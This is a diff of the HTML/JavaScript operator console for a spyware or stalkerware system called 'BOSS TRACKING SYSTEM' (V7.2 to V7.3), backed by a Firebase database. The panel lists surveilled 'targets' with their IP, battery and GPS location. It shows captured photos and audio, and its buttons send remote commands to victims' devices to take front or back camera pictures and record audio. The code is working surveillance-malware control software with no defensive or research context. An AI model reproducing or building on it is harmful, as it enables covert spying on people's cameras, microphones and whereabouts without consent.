@@ -2,110 +2,136 @@
 <html lang="en">
 <head>
     <meta charset="UTF-8">
-    <title>BOSS_TRACKING SYSTEM V7.2</title>
+    <title>BOSS_TRACKING SYSTEM V7.3</title>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        :root { --neon: #00ff41; --bg: #050505; --panel: #0d0d0d; --red: #ff3131; }
-        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; overflow: hidden; }
-        .sidebar { width: 300px; border-right: 1px solid #222; background: #000; display: flex; flex-direction: column; }
-        .sidebar-header { padding: 20px; border-bottom: 1px solid #222; text-align: center; }
-        .node-list { flex: 1; overflow-y: auto; padding: 10px; }
-        .node-item { border: 1px solid #222; padding: 12px; margin-bottom: 8px; cursor: pointer; position: relative; display: flex; justify-content: space-between; align-items: center; transition: 0.3s; }
-        .node-item:hover { border-color: var(--neon); }
-        .node-item.active { border-color: var(--neon); background: rgba(0, 255, 65, 0.1); }
-        .status-dot { width: 8px; height: 8px; border-radius: 50%; background: #444; margin-right: 5px; }
-        .online { background: var(--neon); box-shadow: 0 0 8px var(--neon); }
-        .watching-tag { font-size: 9px; color: var(--neon); animation: blink 1s infinite; display: block; }
-        @keyframes blink { 0%, 100% { opacity: 1; } 50% { opacity: 0; } }
-        .protocol-red { color: var(--red); font-weight: bold; text-shadow: 0 0 5px var(--red); text-transform: uppercase; }
-        .del-user { color: var(--red); font-weight: bold; border: 1px solid var(--red); padding: 2px 6px; cursor: pointer; font-size: 10px; }
-        .del-user:hover { background: var(--red); color: white; }
-        .main-content { flex: 1; display: flex; flex-direction: column; background: var(--bg); }
-        .controls { padding: 20px; display: flex; gap: 10px; background: #0a0a0a; border-bottom: 1px solid #222; }
-        .btn { background: transparent; border: 1px solid var(--neon); color: var(--neon); padding: 8px 15px; cursor: pointer; font-size: 11px; font-weight: bold; }
+        :root { --neon: #00ff41; --bg: #0a0a0a; --red: #ff3131; }
+        body { background: var(--bg); color: var(--neon); font-family: 'Courier New', monospace; margin: 0; display: flex; height: 100vh; }
+        
+        /* Left Sidebar */
+        .sidebar { width: 300px; border-right: 2px solid #222; overflow-y: auto; background: #000; }
+        .sidebar-title { padding: 15px; background: #111; color: #fff; border-bottom: 2px solid var(--neon); font-weight: bold; }
+        .target-item { padding: 15px; border-bottom: 1px solid #222; cursor: pointer; position: relative; }
+        .target-item:hover { background: #0d0d0d; }
+        .target-item.active { border-left: 5px solid var(--neon); background: #111; }
+        .status-blink { float: right; font-size: 10px; animation: blink 1s infinite; color: var(--neon); }
+        .del-user-btn { position: absolute; right: 10px; bottom: 10px; color: var(--red); border: 1px solid var(--red); padding: 2px 5px; font-size: 10px; cursor: pointer; }
+
+        /* Main Panel */
+        .main { flex: 1; display: flex; flex-direction: column; padding: 20px; overflow-y: auto; }
+        .header { display: flex; justify-content: space-between; margin-bottom: 20px; }
+        .action-btns { display: grid; grid-template-columns: repeat(4, 1fr); gap: 10px; margin-bottom: 20px; }
+        .btn { background: #000; border: 1px solid var(--neon); color: var(--neon); padding: 10px; cursor: pointer; font-weight: bold; }
         .btn:hover { background: var(--neon); color: #000; }
-        .grid { display: grid; grid-template-columns: 1fr 1.5fr; gap: 20px; padding: 20px; overflow-y: auto; }
-        .box { background: var(--panel); border: 1px solid #222; padding: 15px; }
-        .feed { display: grid; grid-template-columns: repeat(auto-fill, minmax(150px, 1fr)); gap: 10px; }
-        .media-card { background: #000; border: 1px solid #333; padding: 5px; text-align: center; }
-        .media-card img { width: 100%; border-bottom: 1px solid #222; }
-        audio { width: 100%; height: 30px; filter: invert(1); }
+        .btn-red { border-color: var(--red); color: var(--red); }
+
+        /* Content Grid */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 20px; }
+        .box { background: #111; border: 1px solid #222; padding: 15px; min-height: 200px; }
+        .box h3 { margin-top: 0; border-bottom: 1px solid #333; padding-bottom: 10px; font-size: 14px; }
+        
+        .media-grid { display: grid; grid-template-columns: repeat(auto-fill, minmax(120px, 1fr)); gap: 10px; }
+        .media-card { border: 1px solid #333; position: relative; }
+        .media-card img { width: 100%; }
+        .del-media { position: absolute; top: 0; right: 0; background: var(--red); color: #fff; border: none; cursor: pointer; }
+
+        @keyframes blink { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
 
-    <div class="sidebar">
-        <div class="sidebar-header">
-            <h2 style="margin:0; font-size:18px;">BOSS_V7 <span class="protocol-red">SRV_2285</span></h2>
-            <small class="protocol-red">ZOMBIE_PROTOCOL_ACTIVE</small>
+<div class="sidebar">
+    <div class="sidebar-title">BOSS TRACKING SYSTEM <span style="color:var(--red); font-size:10px;">V7.3</span></div>
+    <div id="target-list"></div>
+</div>
+
+<div class="main" id="admin-ui" style="display:none;">
+    <div class="header">
+        <h2 id="active-id">NODE_XXXXX</h2>
+        <div>
+            <input type="text" id="rename-input" placeholder="Set Name..." style="background:#000; color:#fff; border:1px solid #333; padding:5px;">
+            <button class="btn" onclick="renameTarget()">SAVE NAME</button>
         </div>
-        <div class="node-list" id="node-list"></div>
     </div>
 
-    <div class="main-content" id="main-ui" style="display:none;">
-        <div class="controls">
-            <button class="btn" onclick="sendCommand('photo')">📸 FRONT</button>
-            <button class="btn" onclick="sendCommand('back_photo')">📸 BACK</button>
-            <button class="btn" onclick="sendCommand('audio')">🎙️ RECORD 30S</button>
-            <button class="btn" style="border-color:var(--red); color:var(--red)" onclick="deleteTargetData()">🗑️ WIPE ALL</button>
+    <div class="action-btns">
+        <button class="btn" onclick="sendCmd('photo')">CAPTURE PHOTO</button>
+        <button class="btn" onclick="sendCmd('back_photo')">BACK CAMERA</button>
+        <button class="btn" onclick="sendCmd('audio')">AUDIO RECORD</button>
+        <button class="btn-red btn" onclick="wipeTarget()">DELETE USER DATA</button>
+    </div>
+
+    <div class="grid">
+        <div class="box">
+            <h3>LOGS / DETAILS</h3>
+            <div id="log-data"></div>
         </div>
-        <div class="grid">
-            <div class="box"><h3>📍 LOCATION</h3><div id="map-container"></div></div>
-            <div class="box"><h3>⚙️ LOGS</h3><div id="log-content"></div></div>
-            <div class="box" style="grid-column: span 2;"><h3>📁 INTEL FEED</h3><div class="feed" id="intel-feed"></div></div>
+        <div class="box">
+            <h3>MAP_TRACKER</h3>
+            <div id="map-frame"></div>
+        </div>
+        <div class="box" style="grid-column: span 2;">
+            <h3>VISUAL & AUDIO DATA</h3>
+            <div class="media-grid" id="media-feed"></div>
         </div>
     </div>
+</div>
 
 <script>
     const firebaseConfig = { databaseURL: "https://mytrecker2-b3535-default-rtdb.firebaseio.com/" };
     firebase.initializeApp(firebaseConfig);
     const db = firebase.database();
-    let selectedNode = null;
+    let currentID = null;
 
     db.ref('targets').on('value', snap => {
-        const list = document.getElementById('node-list');
+        const list = document.getElementById('target-list');
         list.innerHTML = "";
         snap.forEach(child => {
-            const id = child.key;
             const data = child.val();
-            const name = data.customName || id;
-            const isWatching = (data.info && data.info.status === "ONLINE");
-            
+            const id = child.key;
+            const isOnline = data.info && data.info.status === "ONLINE";
             list.innerHTML += `
-                <div class="node-item ${selectedNode == id ? 'active' : ''}" onclick="selectNode('${id}')">
-                    <div>
-                        <span class="status-dot ${data.info ? 'online' : ''}"></span>
-                        <strong>${name}</strong>
-                        ${isWatching ? '<span class="watching-tag">WATCHING VIDEO</span>' : ''}
-                    </div>
-                    <span class="del-user" onclick="event.stopPropagation(); deleteTarget('${id}')">X</span>
+                <div class="target-item ${currentID === id ? 'active' : ''}" onclick="selectTarget('${id}')">
+                    <strong>${data.customName || id}</strong><br>
+                    <small style="color:#555">${id}</small>
+                    ${isOnline ? '<span class="status-blink">online</span>' : ''}
+                    <div class="del-user-btn" onclick="event.stopPropagation(); deleteUser('${id}')">X</div>
                 </div>`;
         });
     });
 
-    function selectNode(id) {
-        selectedNode = id;
-        document.getElementById('main-ui').style.display = 'flex';
+    function selectTarget(id) {
+        currentID = id;
+        document.getElementById('admin-ui').style.display = 'flex';
+        document.getElementById('active-id').innerText = id;
+        
         db.ref(`targets/${id}`).on('value', s => {
             const data = s.val() || {};
             const info = data.info || {};
-            document.getElementById('log-content').innerHTML = `IP: ${info.ip}<br>BATT: ${info.battery}<br>TIME: ${info.time}`;
+            document.getElementById('log-data').innerHTML = `IP: ${info.ip || '--'}<br>Batt: ${info.battery || '--'}<br>Status: ${info.status || 'Offline'}`;
             
-            const feed = document.getElementById('intel-feed');
+            if(data.location) {
+                const url = `https://maps.google.com/maps?q=${data.location.lat},${data.location.lng}&z=15&output=embed`;
+                document.getElementById('map-frame').innerHTML = `<iframe src="${url}" width="100%" height="150" style="border:0; filter:invert(90%)"></iframe>`;
+            }
+
+            const feed = document.getElementById('media-feed');
             feed.innerHTML = "";
-            if(data.photos) Object.entries(data.photos).reverse().forEach(([k, p]) => {
-                feed.innerHTML += `<div class="media-card"><img src="${p.img}"><small>${p.type}</small></div>`;
+            if(data.photos) Object.entries(data.photos).reverse().forEach(([k, v]) => {
+                feed.innerHTML += `<div class="media-card"><img src="${v.img}"><button class="del-media" onclick="delItem('photos/${k}')">X</button></div>`;
             });
-            if(data.audios) Object.entries(data.audios).reverse().forEach(([k, a]) => {
-                feed.innerHTML += `<div class="media-card"><audio controls src="${a.data}"></audio></div>`;
+            if(data.audios) Object.entries(data.audios).reverse().forEach(([k, v]) => {
+                feed.innerHTML += `<div class="media-card"><audio controls src="${v.data}" style="width:100%"></audio><button class="del-media" onclick="delItem('audios/${k}')">X</button></div>`;
             });
         });
     }
 
-    function sendCommand(act) { db.ref(`commands/${selectedNode}`).set({ action: act, ts: Date.now() }); }
-    function deleteTarget(id) { if(confirm("Delete this user?")) db.ref(`targets/${id}`).remove(); }
-    function deleteTargetData() { if(confirm("Wipe data?")) db.ref(`targets/${selectedNode}`).remove(); }
+    function sendCmd(act) { db.ref(`commands/${currentID}`).set({ action: act }); alert("Command Sent!"); }
+    function renameTarget() { db.ref(`targets/${currentID}/customName`).set(document.getElementById('rename-input').value); }
+    function deleteUser(id) { if(confirm("Delete this user entirely?")) db.ref(`targets/${id}`).remove(); }
+    function delItem(path) { db.ref(`targets/${currentID}/${path}`).remove(); }
+    function wipeTarget() { if(confirm("Wipe all data for this node?")) db.ref(`targets/${currentID}`).remove(); }
 </script>
 </body>
 </html>
